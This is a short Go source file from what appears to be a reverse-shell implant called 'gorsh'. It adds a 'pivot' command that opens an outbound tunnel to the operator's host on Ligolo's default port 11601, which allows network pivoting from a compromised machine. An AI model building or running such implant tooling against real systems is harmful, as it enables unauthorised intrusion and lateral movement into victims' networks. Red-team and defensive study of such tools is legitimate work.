package cmds

import (
	"fmt"

	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/pivot"
	"github.com/abiosoft/ishell"
)

func Pivot(c *ishell.Context) {
	// ligolo's default listen port
	host := fmt.Sprintf("%s:11601", myconn.Host())
	if len(c.Args) == 1 {
		host = c.Args[0]
	}
	go pivot.Connect(host)
}
